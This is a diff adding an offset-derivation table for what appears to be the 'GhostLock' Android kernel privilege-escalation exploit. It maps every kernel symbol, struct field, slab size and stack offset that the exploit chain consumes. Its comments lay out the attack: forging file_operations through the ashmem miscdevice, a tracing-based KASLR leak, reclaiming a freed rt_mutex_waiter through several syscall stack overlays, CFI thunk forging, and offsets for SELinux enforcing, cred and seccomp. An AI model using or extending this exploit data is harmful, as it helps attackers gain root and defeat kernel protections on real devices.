@@ -1,0 +1,447 @@
+# offset-maps.txt — the one table of how every committed target.h offset is
+# derived from a kernel build. Read by both paths, so they cannot drift:
+#
+#   runner/scripts/harvest-live.sh   live, from a rooted device
+#   tools/pixel-image/derive_offsets.py   offline, from a public boot.img
+#
+# Both feed runner/scripts/lib/offset_rules.py, which implements one resolver
+# per rule. A row is `MACRO <rule fields...>`; `#` comments and blank lines are
+# ignored. Sections are named by the env var offset_report.py reads.
+#
+# Anything expressible here belongs here. An addend or an anchor rule written
+# only in a header comment is a derivation nobody can re-run and offsets.report
+# cannot check, no matter how central the constant it derives -- SLIDE_TRACE_
+# MARK_IP_OFF, the single constant every root run consumes, is exactly such a
+# case.
+
+
+[SYMMAP]
+# MACRO  symbol[|alt-symbol...]  addend
+#
+# Symbol addresses; they rot every build. Alternatives exist because the same
+# object is renamed across kernel versions (6.1 generic_file_splice_read ->
+# 6.6 copy_splice_read). The addend is link-time arithmetic on top of the
+# symbol, for macros that name a field or element rather than the symbol.
+ASHMEM_IOCTL_OFF ashmem_ioctl 0
+ASHMEM_MMAP_OFF ashmem_mmap 0
+ASHMEM_OPEN_OFF ashmem_open 0
+ASHMEM_RELEASE_OFF ashmem_release 0
+ASHMEM_SHOW_FDINFO_OFF ashmem_show_fdinfo 0
+ASHMEM_FOPS_OFF ashmem_fops 0
+# The ashmem miscdevice's own file_operations pointer field -- GhostLock's
+# write target. ashmem_misc is a data symbol present in kallsyms on qgki-5.4,
+# so its offset plus miscdevice.fops (0x10) is the authoritative derivation;
+# see the PTRMAP note for the older findptr path used only where the symbol is
+# stripped.
+ASHMEM_MISC_FOPS_OFF ashmem_misc 0x10
+# The configfs read/write entry points the forged fops calls through.
+# configfs converted these to iter ops in 5.13; before that the same
+# copy through the same configfs_buffer is reached by .read/.write under
+# different names. pread/pwrite drive both, so only the name and the fops
+# slot differ -- the slot is CONFIGFS_RW_SLOT_READ in the target header.
+# The macro keeps its 6.1/6.6 name so 19 committed headers stay valid.
+# Before the iter conversion the pair is the PLAIN .read/.write, not the _bin_
+# forms: the bin forms open with to_frag(file), which walks
+# file->f_path.dentry->d_fsdata, and the descriptor this gadget is driven
+# through is not a configfs one, so that dereference faults before
+# private_data is ever read. The plain pair starts at private_data.
+CONFIGFS_READ_ITER_OFF configfs_read_iter|configfs_read_file 0
+CONFIGFS_BIN_WRITE_ITER_OFF configfs_bin_write_iter|configfs_write_file 0
+COPY_SPLICE_READ_OFF copy_splice_read|generic_file_splice_read 0
+NOOP_LLSEEK_OFF noop_llseek 0
+INIT_TASK_OFF init_task 0
+ROOT_TASK_GROUP_OFF root_task_group 0
+SELINUX_ENFORCING_OFF selinux_state 1
+SELINUX_BLOB_SIZES_OFF selinux_blob_sizes 0
+SECURITY_HOOK_HEADS_OFF security_hook_heads 0
+KMALLOC_CACHES_OFF kmalloc_caches 0
+ANON_PIPE_BUF_OPS_OFF anon_pipe_buf_ops 0
+# The wake callback a forged eppoll_entry names as its .func, and so the one
+# symbol a chain built on that callback cannot do without.
+EP_POLL_CALLBACK_OFF ep_poll_callback 0
+# The version string, as a read target that identifies itself: a chain that has
+# just built a kernel read confirms it by reading these bytes, with no second
+# observer and no privileged oracle.
+LINUX_BANNER_OFF linux_banner 0
+# Every registered input_dev is on this list, which is how a leaked one is found
+# again by name. kptr_restrict is 2 on these builds, so it cannot be re-read at
+# run time -- it has to come from the image.
+INPUT_DEV_LIST_OFF input_dev_list 0
+CALL_USERMODEHELPER_EXEC_WORK_OFF call_usermodehelper_exec_work 0
+SYSTEM_UNBOUND_WQ_OFF system_unbound_wq 0
+# Slide references. Until these rows existed, offsets.report checked none of
+# them; the arithmetic lived only in prose above each #define.
+SLIDE_NFULNL_LOGGER_OFF nfulnl_logger 0
+SLIDE_SYSCTL_BOOTID_OFF sysctl_bootid 0
+# loggers[0][NF_LOG_TYPE_ULOG=1] = loggers + 8, and holds &nfulnl_logger.
+SLIDE_LOGGERS_0_1_OFF loggers 8
+# random_table[4] is the boot_id ctl_table entry and +0x8 is its .data
+# pointer: 4 * sizeof(struct ctl_table) + 8 = 4 * 0x40 + 8 = 0x108, on a build
+# where sizeof(struct ctl_table) is 0x40 and boot_id is the table's 5th entry;
+# offsets.report checks both terms against each target's own BTF and Image
+# rather than assuming they hold everywhere.
+SLIDE_RANDOM_BOOT_ID_DATA_OFF random_table 0x108
+
+
+[STRUCTMAP]
+# MACRO  struct.path[|struct.path...]
+#
+# The layout assumptions the exploit bakes in. KMI says they are stable across
+# a flavour; BTF measures them per build -- and the BTF is in the kernel image
+# itself, so this section needs no device either.
+#
+# Alternatives, as in SYMMAP, cover a field that was renamed or re-nested.
+# 6.6 folded rt_mutex_waiter's rb_node/prio/deadline into an rt_waiter_node,
+# so tree_entry became tree.entry and every field after it moved by 0x20 --
+# exactly the kind of drift this section exists to catch: BTF measures the
+# true layout per build, so a value transcribed by hand into a header can
+# silently disagree with it until this table is walked against that build's
+# own capture.
+TASK_PID_OFF task_struct.pid
+TASK_TGID_OFF task_struct.tgid
+TASK_REAL_PARENT_OFF task_struct.real_parent
+TASK_REAL_CRED_OFF task_struct.real_cred
+TASK_CRED_OFF task_struct.cred
+TASK_COMM_OFF task_struct.comm
+TASK_TASKS_OFF task_struct.tasks
+TASK_SECCOMP_OFF task_struct.seccomp
+TASK_ATOMIC_FLAGS_OFF task_struct.atomic_flags
+FAKE_TASK_USAGE_OFF task_struct.usage
+FAKE_TASK_PRIO_OFF task_struct.prio
+FAKE_TASK_NORMAL_PRIO_OFF task_struct.normal_prio
+FAKE_TASK_TASK_GROUP_OFF task_struct.sched_task_group
+FAKE_TASK_PI_LOCK_OFF task_struct.pi_lock
+FAKE_TASK_PI_WAITERS_OFF task_struct.pi_waiters
+FAKE_TASK_PI_TOP_TASK_OFF task_struct.pi_top_task
+FAKE_TASK_PI_BLOCKED_ON_OFF task_struct.pi_blocked_on
+CRED_UID_OFF cred.uid
+CRED_SECUREBITS_OFF cred.securebits
+CRED_CAPS_OFF cred.cap_inheritable
+CRED_SECURITY_OFF cred.security
+MM_OWNER_OFF mm_struct.owner
+WAITER_TREE_ENTRY_OFF rt_mutex_waiter.tree_entry|rt_mutex_waiter.tree.entry
+WAITER_PI_TREE_ENTRY_OFF rt_mutex_waiter.pi_tree_entry|rt_mutex_waiter.pi_tree.entry
+WAITER_TASK_OFF rt_mutex_waiter.task
+WAITER_LOCK_OFF rt_mutex_waiter.lock
+WAITER_WAKE_STATE_OFF rt_mutex_waiter.wake_state
+WAITER_WW_CTX_OFF rt_mutex_waiter.ww_ctx
+FOPS_OWNER_OFF file_operations.owner
+FOPS_LLSEEK_OFF file_operations.llseek
+FOPS_READ_OFF file_operations.read
+FOPS_WRITE_OFF file_operations.write
+FOPS_READ_ITER_OFF file_operations.read_iter
+FOPS_WRITE_ITER_OFF file_operations.write_iter
+FOPS_IOCTL_OFF file_operations.unlocked_ioctl
+FOPS_COMPAT_IOCTL_OFF file_operations.compat_ioctl
+TASK_GROUP_LEADER_OFF task_struct.group_leader
+CRED_USAGE_OFF cred.usage
+CRED_USER_OFF cred.user
+CRED_USER_NS_OFF cred.user_ns
+CRED_UCOUNTS_OFF cred.ucounts
+CRED_GROUP_INFO_OFF cred.group_info
+MISCDEVICE_FOPS_OFF miscdevice.fops
+STRUCT_SLAB_CACHE_OFF slab.slab_cache
+STRUCT_PAGE_COMPOUND_HEAD_OFF page.compound_head
+# The records an event-poll chain forges or walks.
+EP_OFF_WQ eventpoll.wq
+EP_OFF_POLL_WAIT eventpoll.poll_wait
+EP_OFF_RDLLIST eventpoll.rdllist
+EP_OFF_LOCK eventpoll.lock
+EP_OFF_RBR eventpoll.rbr
+EP_OFF_OVFLIST eventpoll.ovflist
+EP_OFF_WS eventpoll.ws
+EP_OFF_REFS eventpoll.refs
+# The walk from an mm_struct to a process's open files, for a chain that has a
+# kernel read and no way to ask the kernel for an address.
+MM_PGD_OFF mm_struct.pgd
+TASK_FILES_OFF task_struct.files
+FILES_FDT_OFF files_struct.fdt
+FDT_FD_OFF fdtable.fd
+FILE_PRIVATE_DATA_OFF file.private_data
+PIPE_INODE_OFF_RING_SIZE pipe_inode_info.ring_size
+# wait_queue_head.head / wait_queue_entry.entry: the two list nodes a wake walks,
+# and the pair a forged entry has to be positioned against.
+WAIT_QUEUE_HEAD_OFF wait_queue_head.head
+WAIT_QUEUE_ENTRY_OFF_ENTRY wait_queue_entry.entry
+# struct input_dev, the object a failed driver probe can leak. ->users is the
+# one that matters: input_open_device skips ->open while it is non-zero, so a
+# leaked device whose fields are no longer valid is never walked again.
+INPUT_DEV_NAME_OFF input_dev.name
+INPUT_DEV_USERS_OFF input_dev.users
+INPUT_DEV_NODE_OFF input_dev.node
+EPITEM_OFF_RDLLINK epitem.rdllink
+EPITEM_OFF_FFD epitem.ffd
+EPITEM_OFF_PWQLIST epitem.pwqlist
+EPITEM_OFF_EP epitem.ep
+EPITEM_OFF_FLLINK epitem.fllink
+EPITEM_OFF_WS epitem.ws
+EPITEM_OFF_EVENT epitem.event
+EPPOLL_OFF_BASE eppoll_entry.base
+EPPOLL_OFF_WAIT eppoll_entry.wait
+# The open file a fabricated one has to resemble, and what it is read through.
+FILE_OFF_F_INODE file.f_inode
+FILE_OFF_F_OP file.f_op
+FILE_OFF_F_LOCK file.f_lock
+FILE_OFF_F_COUNT file.f_count
+FILE_OFF_F_POS file.f_pos
+FILE_OFF_PRIVATE_DATA file.private_data
+FILE_OFF_F_EP file.f_ep
+INODE_OFF_I_SB inode.i_sb
+INODE_OFF_I_INO inode.i_ino
+SUPER_BLOCK_OFF_S_DEV super_block.s_dev
+# The pipe ring a borrowed entry belongs to.
+PIPE_INODE_OFF_HEAD pipe_inode_info.head
+PIPE_INODE_OFF_TAIL pipe_inode_info.tail
+PIPE_INODE_OFF_BUFS pipe_inode_info.bufs
+PIPE_BUFFER_OFF_PAGE pipe_buffer.page
+PIPE_BUFFER_OFF_OFFSET pipe_buffer.offset
+PIPE_BUFFER_OFF_LEN pipe_buffer.len
+PIPE_BUFFER_OFF_OPS pipe_buffer.ops
+PIPE_BUFFER_OFF_FLAGS pipe_buffer.flags
+PIPE_BUFFER_OFF_PRIVATE pipe_buffer.private
+# The buffer descriptor a name-blob write redirects.
+CFG_PAGE_OFF configfs_buffer.page
+CFG_NEEDS_READ_FILL_OFF configfs_buffer.needs_read_fill
+CFG_BIN_BUFFER_OFF configfs_buffer.bin_buffer
+CFG_BIN_BUFFER_SIZE_OFF configfs_buffer.bin_buffer_size
+CFG_CB_MAX_SIZE_OFF configfs_buffer.cb_max_size
+FOPS_MMAP_OFF file_operations.mmap
+FOPS_OPEN_OFF file_operations.open
+FOPS_RELEASE_OFF file_operations.release
+FOPS_SPLICE_READ_OFF file_operations.splice_read
+FOPS_SHOW_FDINFO_OFF file_operations.show_fdinfo
+STRUCT_PAGE_SIZE page
+WQ_DFL_PWQ_OFF workqueue_struct.dfl_pwq
+PWQ_POOL_OFF pool_workqueue.pool
+PWQ_WQ_OFF pool_workqueue.wq
+PWQ_WORK_COLOR_OFF pool_workqueue.work_color
+PWQ_REFCNT_OFF pool_workqueue.refcnt
+PWQ_NR_IN_FLIGHT_OFF pool_workqueue.nr_in_flight
+PWQ_NR_ACTIVE_OFF pool_workqueue.nr_active
+PWQ_MAX_ACTIVE_OFF pool_workqueue.max_active
+PWQ_DELAYED_WORKS_OFF pool_workqueue.delayed_works
+POOL_WORKLIST_OFF worker_pool.worklist
+POOL_NR_IDLE_OFF worker_pool.nr_idle
+WORK_DATA_OFF work_struct.data
+WORK_ENTRY_OFF work_struct.entry
+WORK_FUNC_OFF work_struct.func
+SECCOMP_MODE_OFF seccomp.mode
+SECCOMP_FILTER_OFF seccomp.filter
+
+
+[SIZEMAP]
+# MACRO  struct
+#
+# Whole-record sizes. A chain reads a record in one access, or picks the
+# allocator cache a record falls in from its size, so a size that disagrees
+# with the build reads past the end or grooms the wrong cache.
+CRED_SIZE cred
+EVENTPOLL_SIZE eventpoll
+EPITEM_SIZE epitem
+FILE_SIZE file
+PIPE_BUFFER_SIZE pipe_buffer
+
+
+[ENUMMAP]
+# MACRO  enumerator
+#
+# Values that are enumerators in the kernel rather than offsets. They are
+# transcribed by hand exactly as offsets are, and are exactly as easy to get
+# wrong -- with the difference that a wrong bit position produces a check that
+# silently tests two unrelated flags instead of failing to compile.
+PG_SLAB_BIT PG_slab
+PG_HEAD_BIT PG_head
+KMALLOC_NORMAL_TYPE KMALLOC_NORMAL
+KMALLOC_CGROUP_TYPE KMALLOC_CGROUP
+KMALLOC_CACHE_TYPES NR_KMALLOC_TYPES
+
+
+[SLABMAP]
+# MACRO  cache-name  objsize|objperslab|pagesperslab
+#
+# sizeof(struct mm_struct) is 0x3c0 but the cache strides 0x400, and
+# KernelSnitch walks the stride — committing the BTF size breaks the mm_struct
+# leak (see the MM_STRUCT_SZ note in target.h).
+MM_STRUCT_SZ mm_struct objsize
+MM_ORDER_PAGES mm_struct pagesperslab
+
+
+[PTRMAP]
+# MACRO  deref    base-macro    byte-offset
+# MACRO  findptr  target-macro  back-offset
+#
+# Offsets no symbol table exposes. `ashmem_compat_ioctl` is static, so kallsyms
+# drops it, and BTF has no data-symbol addresses; it is reached by chasing a
+# pointer through ashmem_fops in the Image. `findptr` demands exactly one hit,
+# so an ambiguous match is an UNRESOLVED rather than a wrong answer.
+#
+# findptr's "exactly one hit" guard is not safe for ASHMEM_MISC_FOPS_OFF when
+# the miscdevice.fops field is a RELATIVE relocation whose addend is not
+# stored inline (qgki-5.4): the scan can lock onto a different, coincidental
+# inline pointer to ashmem_fops and return it as "unique". ashmem_misc IS a
+# kallsyms data symbol on 5.4, so it is derived in SYMMAP as
+# `ashmem_misc + miscdevice.fops(0x10)` instead. findptr remains the right
+# rule only for a build that both strips ashmem_misc and stores the pointer
+# inline.
+#
+# The byte-offset field may name another macro instead of a literal, and here
+# it must: file_operations.compat_ioctl is 0x58 on android14-6.1 and 0x50 on
+# android15-6.6, so a literal offset here would read the wrong slot on one of
+# the two families; naming the macro keeps the derivation correct on both.
+ASHMEM_COMPAT_IOCTL_OFF deref ASHMEM_FOPS_OFF FOPS_COMPAT_IOCTL_OFF
+
+
+[CODEMAP]
+# MACRO  cbz-to-warn  symbol  span     -> offset WITHIN symbol
+# MACRO  self-addr    symbol  0        -> offset within the IMAGE
+#
+# Offsets that only the instruction stream carries. The two rules report
+# different things because the two macros hold different things: a kprobe
+# oracle is placed relative to its function, while SLIDE_TRACE_MARK_IP_OFF is
+# an image offset the payload subtracts from a leaked pointer.
+#
+# self-addr finds the adrp/add pair inside <symbol> whose computed address
+# lands back inside <symbol> — how the compiler materialises _THIS_IP_. That
+# is the value tracing_mark_write stores into print_entry.ip, which is the
+# whole KASLR leak (cves/lib/kaslr/README.md). It is not KMI-stable — 0x164 on
+# android14-6.1, 0x15c on android15-6.6 — which is exactly why it has to be a
+# rule and cannot be a SYMMAP addend.
+POSIX_CPU_TIMER_DEL_RACE_OFF cbz-to-warn posix_cpu_timer_del 4
+SLIDE_TRACE_MARK_IP_OFF self-addr tracing_mark_write 0
+
+[STACKMAP]
+# MACRO  stack-overlay  <first_word>   -> a SIGNED word index
+#
+# Not an address: a relation between two kernel stack frames. The pselect
+# reclaim vehicle overlays fd_set bitmaps onto the freed rt_mutex_waiter, and
+# this is the word of core_sys_select()'s stack_fds the waiter lands on, minus
+# the index the payload's word map starts at ([pselect_map].first_word in
+# runner/stages/entry.ghostlock@6.1/stage.toml).
+#
+# Per build, not per kernel version. The landing word is decided by the
+# compiler's frame layout and by whether the intermediate call survived
+# inlining, so two builds of one kernel version can differ and one of them can
+# be unusable; inheriting the value from a sibling flavour has no basis. The
+# rule reports UNRESOLVED when a chain link was inlined away, which is the same
+# answer as "this build cannot use the pselect vehicle".
+PSELECT_WAITER_WORD_SHIFT stack-overlay 2
+
+# MACRO  stack-bytes-sigreturn  (no argument)   -> a SIGNED byte offset
+#
+# The sigreturn vehicle's analogue: raising a signal on this thread copies a
+# flat struct user_fpsimd_state.vregs onto __arm64_sys_rt_sigreturn's own
+# stack frame (or, on a build where restore_fpsimd_context survives as its
+# own function, that function's frame instead -- offset_rules.py's
+# _sigreturn_delta() picks between the two shapes by which symbols this
+# build's kallsyms actually has), and this is the byte distance from that
+# copy's start to where the freed rt_mutex_waiter lands -- no word index, no
+# first_word, since the copy is a flat buffer rather than pselect's
+# word-indexed fd_set. A target's own runtime gate
+# (SIGRETURN_WAITER_OFF_GATE_FAIL, cve-2026-43499-ghostlock/main.c) refuses
+# whatever this value turns out to be if it does not fit inside
+# [0, SIGRETURN_VREGS_BYTES - FAKE_WAITER_LAYOUT_SIZE] -- this rule only
+# measures the fact, never judges whether it is usable.
+SIGRETURN_WAITER_OFF stack-bytes-sigreturn
+
+# MACRO  stack-bytes-clone3  (no argument)   -> a SIGNED byte offset
+#
+# The clone3 vehicle's analogue: __arm64_sys_clone3(2) copies the fixed-size
+# `struct clone_args` uapi argument onto copy_clone_args_from_user()'s own
+# stack frame (via the inlined copy_struct_from_user()), and this is the
+# byte distance from that copy's start to where the freed rt_mutex_waiter
+# lands -- no word index, flat buffer, same shape as SIGRETURN_WAITER_OFF
+# above. offset_rules.py's _CLONE3_WITNESSES comment explains the one thing
+# that differs by build here: whether the copy calls __arch_copy_from_user
+# directly or an out-of-line per-TU "_copy_from_user" clone -- resolving the
+# latter needs load_duplicate_addrs()/load_duplicate_addrs_from_text() run
+# first (both derive_offsets.py and harvest-live.sh's offset_report.py do
+# this unconditionally, so no extra wiring is needed by a caller of either).
+#
+# struct clone_args is 0x58 bytes on a build with set_tid/set_tid_size/
+# cgroup (flags@0, pidfd@8, child_tid@0x10, parent_tid@0x18,
+# exit_signal@0x20, stack@0x28, stack_size@0x30, tls@0x38, set_tid@0x40,
+# set_tid_size@0x48, cgroup@0x50) and 0x40 bytes without them (same first 8
+# fields, CLONE_ARGS_SIZE_VER0); copy_clone_args_from_user checks
+# args.exit_signal immediately after this copy and returns -EINVAL before
+# clone3_args_valid()/_do_fork() are ever reached if that check fails --
+# whether a vehicle built on this offset reaches that same check, a
+# different (later, weaker) one, or corrupts a field no check reads at all,
+# depends on where WAITER_TASK_OFF/WAITER_LOCK_OFF (STRUCTMAP, above) plus
+# this delta land inside those field boundaries; this rule measures the byte
+# distance only, never which field that lands on.
+CLONE3_WAITER_OFF stack-bytes-clone3
+
+# MACRO  stack-bytes-process-vm  (no argument)   -> a SIGNED byte offset
+#
+# The process_vm_readv/process_vm_writev vehicle's analogue: process_vm_rw()
+# copies its "remote" struct iovec[UIO_FASTIOV] argument onto its own stack
+# frame -- a FULL flat buffer, not a narrow 2-field target like clone3, same
+# shape as SIGRETURN_WAITER_OFF above. Unlike clone3 this never needs
+# load_duplicate_addrs(): both kernel shapes checked (android14-6.1's
+# iovec_from_user, qgki-5.4's older rw_copy_check_uvector) take the fast
+# array's address as a direct argument, offset_rules.py's
+# _PROCESS_VM_WITNESSES comment has the details. A target's own runtime gate
+# (PROCESS_VM_WAITER_OFF_GATE_FAIL, cve-2026-43499-ghostlock/main.c) refuses
+# whatever this value turns out to be if it does not fit inside
+# [0, PROCESS_VM_IOVSTACK_BYTES - FAKE_WAITER_LAYOUT_SIZE].
+PROCESS_VM_WAITER_OFF stack-bytes-process-vm
+
+# MACRO  stack-bytes-bpf  (no argument)   -> a SIGNED byte offset
+#
+# The bpf(2) vehicle's analogue: every bpf(2) command shares one front-door
+# copy, __sys_bpf()'s/__do_sys_bpf()'s own stack-local `union bpf_attr attr`.
+# A narrow two-field write (task, lock only) into a buffer this vehicle
+# fully owns, not an ABI-fixed struct like clone3's, so it needs a bounded
+# window like SIGRETURN_WAITER_OFF/PROCESS_VM_WAITER_OFF rather than
+# clone3's exact match. Picks between two chain shapes by which survives in
+# kallsyms (offset_rules.py's _bpf_delta()): android14-6.1/android15-6.6
+# keep __sys_bpf as its own function; qgki-5.4's older compiler keeps only
+# __do_sys_bpf, with __sys_bpf itself inlined away. A target's own runtime
+# gate (bpf_gate_check(), cve-2026-43499-ghostlock/fops_bpf.c) refuses
+# whatever this value turns out to be if either written field would not fit
+# inside [0, BPF_ATTR_BYTES - 8].
+BPF_WAITER_OFF stack-bytes-bpf
+
+# MACRO  stack-bytes-mcast  (no argument)   -> a SIGNED byte offset
+#
+# The IPv4 MCAST_JOIN_SOURCE_GROUP vehicle: one setsockopt(2) copies a
+# 264-byte struct group_source_req onto do_ip_setsockopt()'s own stack frame
+# (do_mcast_group_source inlined), a FULL-waiter write like pselect's -- it
+# can carry the whole bridge (tree_entry children, task and lock) in a single
+# copy, unlike the narrow two-field vehicles. offset_rules.py's _mcast_delta()
+# anchors the buffer on the memset(&greqs, 0, 0x108) that precedes the
+# optlen-sized copy (the copy's own size is a register), and hand-sums the
+# chain because its two indirect socket-ops hops keep it off
+# chain_slot_delta()'s validated path. The value is very version-dependent:
+# it lands in the complete-bridge window only where the setsockopt buffer
+# overlaps the deeper futex waiter (a 5.15-GKI property; on 6.1/5.4 it lands
+# far positive, buffer shallower than the waiter). mcast_gate_check()
+# (cve-2026-43499-ghostlock/fops_mcast.c) refuses whatever this turns out to
+# be unless the full waiter fits: MCAST_WAITER_OFF in [0, MCAST_BUF_BYTES-0x40].
+MCAST_WAITER_OFF stack-bytes-mcast
+
+[JTMAP]
+# MACRO  <symbol|alt-symbol...>  |  MACRO at-offset <MACRO>
+#
+# What a forged function-pointer slot has to hold.
+#
+# A kernel built with CFI jump tables stores a four-byte thunk (`b <function>`)
+# in every function-pointer table and checks an indirect call against the
+# thunk, not the function body. A forged table carrying bodies aborts the first
+# time anything calls through it. Where the build has no jump table the
+# resolver answers with the function's own offset, which is what that build's
+# genuine tables hold -- so one row covers both kinds of build and a target
+# header states *_CALLABLE_OFF only where it differs from the function.
+#
+# `at-offset` is for a function kallsyms does not expose: it takes the address
+# from another macro's value rather than from a symbol.
+ASHMEM_IOCTL_CALLABLE_OFF ashmem_ioctl
+ASHMEM_COMPAT_IOCTL_CALLABLE_OFF ashmem_compat_ioctl|compat_ashmem_ioctl
+ASHMEM_MMAP_CALLABLE_OFF ashmem_mmap
+ASHMEM_OPEN_CALLABLE_OFF ashmem_open
+ASHMEM_RELEASE_CALLABLE_OFF ashmem_release
+ASHMEM_SHOW_FDINFO_CALLABLE_OFF ashmem_show_fdinfo
+COPY_SPLICE_READ_CALLABLE_OFF copy_splice_read|generic_file_splice_read
+CONFIGFS_READ_ITER_CALLABLE_OFF configfs_read_iter|configfs_read_file
+CONFIGFS_BIN_WRITE_ITER_CALLABLE_OFF configfs_bin_write_iter|configfs_write_file
+CALL_USERMODEHELPER_EXEC_WORK_CALLABLE_OFF call_usermodehelper_exec_work
